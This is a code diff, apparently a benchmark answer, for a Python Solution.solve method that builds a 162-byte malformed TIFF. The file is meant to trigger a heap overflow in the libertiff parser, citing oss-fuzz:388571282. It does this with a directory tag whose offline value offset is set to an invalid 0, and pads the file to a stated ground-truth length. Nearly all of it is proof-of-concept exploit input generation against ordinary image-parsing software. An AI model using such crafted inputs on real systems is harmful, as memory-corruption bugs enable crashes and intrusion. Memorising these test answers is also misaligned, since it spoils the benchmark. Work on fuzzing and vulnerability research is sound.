@@ -1,24 +1,47 @@
 import os
 import struct
+import tempfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
+        # Create a minimal TIFF file with an invalid offline tag (value offset = 0)
+        # This exploits the libertiff vulnerability described in oss-fuzz:388571282
+        
         # TIFF header (little-endian)
-        data = b'II\x2A\x00\x08\x00\x00\x00'
+        # Byte order: II (little-endian), magic: 42, IFD offset: 8
+        tiff_data = bytearray()
+        tiff_data.extend(b'II')          # Little-endian
+        tiff_data.extend(struct.pack('<H', 42))  # TIFF version
+        tiff_data.extend(struct.pack('<I', 8))   # Offset to first IFD
         
-        # IFD with 1 entry
-        data += b'\x01\x00'
+        # IFD structure
+        ifd_offset = len(tiff_data)
         
-        # Offline tag (50706 = 0xC612 is a private DNG tag, often used for offline data)
-        # Tag = 0xC612 (50706), Type = 13 (IFD), Count = 1, Value = 0 (invalid offset)
-        data += struct.pack('<HHII', 0xC612, 13, 1, 0)
+        # Number of directory entries (tags)
+        # We'll create 1 tag that triggers the vulnerability
+        tiff_data.extend(struct.pack('<H', 1))
         
-        # Next IFD offset
-        data += b'\x00\x00\x00\x00'
+        # Tag structure (12 bytes each):
+        # Tag ID: 0x0153 (SampleFormat - arbitrary tag that can be offline)
+        # Type: 3 (SHORT)
+        # Count: 10 (enough to require offline storage)
+        # Value offset: 0 (INVALID - triggers the vulnerability)
+        tag_id = 0x0153  # SampleFormat tag
+        data_type = 3    # SHORT
+        count = 10       # Requires 20 bytes, needs offline storage
+        value_offset = 0 # INVALID OFFSET - triggers heap overflow
         
-        # Pad to exact ground-truth length of 162 bytes
-        # The padding contains additional TIFF structure to ensure parsing continues
-        padding = b'\x00' * (162 - len(data))
-        data += padding
+        tiff_data.extend(struct.pack('<H', tag_id))
+        tiff_data.extend(struct.pack('<H', data_type))
+        tiff_data.extend(struct.pack('<I', count))
+        tiff_data.extend(struct.pack('<I', value_offset))
         
-        return data
+        # Next IFD offset (0 = end)
+        tiff_data.extend(struct.pack('<I', 0))
+        
+        # Add padding to reach 162 bytes (ground-truth length)
+        # The exact content doesn't matter much for triggering the vulnerability
+        remaining_bytes = 162 - len(tiff_data)
+        tiff_data.extend(b'\x00' * remaining_bytes)
+        
+        return bytes(tiff_data)
